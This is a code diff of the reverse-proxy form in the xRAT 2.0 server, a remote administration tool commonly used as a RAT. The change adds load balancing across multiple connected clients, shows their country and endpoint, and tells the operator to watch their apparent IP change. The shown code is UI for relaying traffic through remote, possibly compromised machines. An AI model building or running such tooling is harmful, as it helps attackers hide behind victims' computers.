@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Windows.Forms;
 using xServer.Core;
 using xServer.Core.ReverseProxy;
@@ -7,20 +8,36 @@ namespace xServer.Forms
 {
     public partial class FrmReverseProxy : Form
     {
-        private readonly Client _connectClient;
+        private readonly Client[] clients;
         private ReverseProxyServer SocksServer { get; set; }
         private delegate void Invoky();
+        private ReverseProxyClient[] OpenConnections;
+        private Timer RefreshTimer;
 
-        public FrmReverseProxy(Client client)
+        public FrmReverseProxy(Client[] clients)
         {
             InitializeComponent();
-            _connectClient = client;
-            _connectClient.Value.FrmProxy = this;
+            this.clients = clients;
+
+            for(int i = 0; i < clients.Length; i++)
+                clients[i].Value.FrmProxy = this;
         }
 
         private void FrmReverseProxy_Load(object sender, EventArgs e)
         {
-            this.Text = string.Format("xRAT 2.0 - Reverse Proxy [{0}:{1}]", _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
+            if (clients.Length > 1)
+            {
+                this.Text = string.Format("xRAT 2.0 - Reverse Proxy [Load-Balancer is active]");
+
+                lblLoadBalance.Text = "The Load Balancer is active, " + clients.Length + " clients will be used as proxy\r\nKeep refreshing at www.ipchicken.com to see if your ip address will keep changing, if so, it works";
+
+            }
+            else if (clients.Length == 1)
+            {
+                this.Text = string.Format("xRAT 2.0 - Reverse Proxy [{0}:{1}]", clients[0].EndPoint.Address.ToString(), clients[0].EndPoint.Port.ToString());
+
+                lblLoadBalance.Text = "The Load Balancer is not active, only 1 client is used, select multiple clients to activate the load balancer";
+            }
         }
 
         private void btnStart_Click(object sender, EventArgs e)
@@ -30,9 +47,14 @@ namespace xServer.Forms
                 SocksServer = new ReverseProxyServer();
                 SocksServer.OnConnectionEstablished += socksServer_onConnectionEstablished;
                 SocksServer.OnUpdateConnection += socksServer_onUpdateConnection;
-                SocksServer.StartServer(_connectClient, "0.0.0.0", (int)nudServerPort.Value);
+                SocksServer.StartServer(clients, "0.0.0.0", (int)nudServerPort.Value);
                 btnStart.Enabled = false;
                 btnStop.Enabled = true;
+
+                RefreshTimer = new Timer();
+                RefreshTimer.Tick += RefreshTimer_Tick;
+                RefreshTimer.Interval = 100;
+                RefreshTimer.Start();
             }
             catch (Exception ex)
             {
@@ -41,35 +63,28 @@ namespace xServer.Forms
             }
         }
 
+        void RefreshTimer_Tick(object sender, EventArgs e)
+        {
+            try
+            {
+                lock (SocksServer)
+                {
+                    this.OpenConnections = SocksServer.OpenConnections;
+                    LvConnections.VirtualListSize = this.OpenConnections.Length;
+                    LvConnections.Refresh();
+                }
+            }
+            catch { }
+        }
+
         void socksServer_onUpdateConnection(ReverseProxyClient proxyClient)
         {
-            if (proxyClient.ListItem != null)
-            {
-                this.Invoke(new Invoky(() =>
-                {
-                    lock (LvConnections)
-                    {
-                        string totalReceivedStr = GetSizeStr(proxyClient.LengthReceived);
-                        string totalSendStr = GetSizeStr(proxyClient.LengthSended);
 
-                        proxyClient.ListItem.SubItems[0].Text = proxyClient.TargetServer;
-                        proxyClient.ListItem.SubItems[1].Text = proxyClient.TargetPort.ToString();
+        }
 
-                        if (proxyClient.ListItem.SubItems[2].Text != totalReceivedStr)
-                            proxyClient.ListItem.SubItems[2].Text = totalReceivedStr;
+        void socksServer_onConnectionEstablished(ReverseProxyClient proxyClient)
+        {
 
-                        if (proxyClient.ListItem.SubItems[3].Text != totalSendStr)
-                            proxyClient.ListItem.SubItems[3].Text = totalSendStr;
-
-
-
-                        if (!proxyClient.IsConnected)
-                        {
-                            LvConnections.Items.Remove(proxyClient.ListItem);
-                        }
-                    }
-                }));
-            }
         }
 
         private string GetSizeStr(long size)
@@ -86,30 +101,9 @@ namespace xServer.Forms
             return size + "B";
         }
 
-        void socksServer_onConnectionEstablished(ReverseProxyClient proxyClient)
-        {
-            if (proxyClient.ListItem == null)
-            {
-                this.Invoke(new Invoky(() =>
-                {
-                    lock (LvConnections)
-                    {
-                        proxyClient.ListItem = new ListViewItem(new string[]
-                        {
-                            proxyClient.TargetServer,
-                            proxyClient.TargetPort.ToString(),
-                            proxyClient.LengthReceived/1024 + "KB",
-                            proxyClient.LengthSended/1024 + "KB",
-                            proxyClient.Type.ToString()
-                        }) { Tag = proxyClient };
-                        LvConnections.Items.Add(proxyClient.ListItem);
-                    }
-                }));
-            }
-        }
-
         private void btnStop_Click(object sender, EventArgs e)
         {
+            RefreshTimer.Stop();
             btnStart.Enabled = true;
             btnStop.Enabled = false;
             if (SocksServer != null)
@@ -128,13 +122,63 @@ namespace xServer.Forms
             //Stop the proxy server if still active
             btnStop_Click(sender, null);
 
-            if (_connectClient.Value != null)
-                _connectClient.Value.FrmProxy = null;
+            for (int i = 0; i < clients.Length; i++)
+            {
+                if (clients[i].Value != null)
+                    clients[i].Value.FrmProxy = null;
+            }
         }
 
         private void nudServerPort_ValueChanged(object sender, EventArgs e)
         {
-            lblProxyInfo.Text = string.Format("Connect to this Socks5 Proxy: 127.0.0.1:{0} (no user/pass)", nudServerPort.Value);
+            lblProxyInfo.Text = string.Format("Connect to this SOCKS5/HTTPS Proxy: 127.0.0.1:{0} (no user/pass)", nudServerPort.Value);
+        }
+
+        private void LvConnections_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
+        {
+            lock (SocksServer)
+            {
+                if (e.ItemIndex < OpenConnections.Length)
+                {
+                    ReverseProxyClient Connection = OpenConnections[e.ItemIndex];
+
+                    e.Item = new ListViewItem(new string[]
+                    {
+                        Connection.Client.EndPoint.ToString(),
+                        Connection.Client.Value.Country,
+                        Connection.TargetServer + (Connection.HostName.Length > 0 ? "    (" + Connection.HostName + ")" : ""),
+                        Connection.TargetPort.ToString(),
+                        GetSizeStr(Connection.LengthReceived),
+                        GetSizeStr(Connection.LengthSended),
+                        Connection.Type.ToString()
+                    }) { Tag = Connection };
+                }
+            }
+        }
+
+        private void killConnectionToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            lock (SocksServer)
+            {
+                if (LvConnections.SelectedIndices.Count > 0)
+                {
+                    //copy the list, it could happen the suddenly the items de-select
+                    int[] items = new int[LvConnections.SelectedIndices.Count];
+                    LvConnections.SelectedIndices.CopyTo(items, 0);
+
+                    foreach (int index in items)
+                    {
+                        if (index < OpenConnections.Length)
+                        {
+                            ReverseProxyClient Connection = OpenConnections[index];
+                            if (Connection != null)
+                            {
+                                Connection.Disconnect();
+                            }
+                        }
+                    }
+                }
+            }
         }
     }
 }
